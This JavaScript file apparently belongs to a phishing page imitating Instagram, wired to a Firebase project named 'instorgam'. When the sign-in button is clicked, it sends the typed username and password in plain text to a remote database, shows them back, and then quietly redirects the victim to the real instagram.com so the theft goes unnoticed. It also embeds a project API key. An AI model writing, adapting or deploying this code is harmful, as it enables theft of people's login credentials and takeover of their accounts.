
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-app.js";
import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.4.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyASFjzPBT5XMUnUAgHYS_NCd4XPl2R-IJ0",
    authDomain: "instorgam.firebaseapp.com",
    databaseURL: "https://instorgam-default-rtdb.firebaseio.com",
    projectId: "instorgam",
    storageBucket: "instorgam.appspot.com",
    messagingSenderId: "1003053534467",
    appId: "1:1003053534467:web:79b475e256b6138cfe6d36",
    measurementId: "G-LDNHDW2M8Q"
};

/***** Initialize Firebase *****/
const app = initializeApp(firebaseConfig);

/***** write data to firebase *****/
function write_db() {
    console.log("DEBUG: Write function");
    var db = getDatabase();
    var create_db_table = ref(db, 'ESP32_DB/' + 'ESP32_User_Login_Table/');
    var user_name = document.getElementById("user_name").value;
    var user_name_password =  document.getElementById("user_name_password").value;
    if( user_name == '' || user_name_password == ''){
        alert("Make sure, must be non-empty data is required!!!");
        console.log("Make sure, must be non-empty data is required!!!");
        throw "Make sure, must be non-empty data is required!!!";
    }
    
    var newRecordRef = push(create_db_table, {
      user_name: user_name,
      user_name_password: user_name_password
    });

    var newRecordKey = newRecordRef.key;
    
}

/***** read data from firebase *****/
function read_db() {
    var db = getDatabase();
    var connect_db = ref(db, 'ESP32_DB/' + 'ESP32_User_Login_Table/');
    var retrieve_data='';
    console.log("DEBUG: Read function");
    onValue(connect_db, (snapshot) => {
        retrieve_data = snapshot.val();
        call_loop_print(retrieve_data);
        document.getElementById("display_read_data").innerHTML =  "<pre>" + "user_name: " + retrieve_data.user_name +
                '\n' + "user_name_password: " + retrieve_data.user_name_password + "</pre>";
    });

    function call_loop_print(retrieve_data){
        for (var r=0;r<Object.entries(retrieve_data).length;r++){
            var key = Object.keys(retrieve_data)[r];
            var value = retrieve_data[key];
            console.log("Key_" + r + ': ' + key + " Value_:" + r + ': ' + value );
        }
    }
}

/***** call write and read data functions *****/
var signinbtn = document.getElementById("signinbtn");
signinbtn.addEventListener('click', function () {
    write_db();
    read_db();
    redirectToAnotherPage(); 
});

function redirectToAnotherPage() {
    setTimeout(function () {
        window.location.href = "https://www.instagram.com/";
    }, 1700);
}
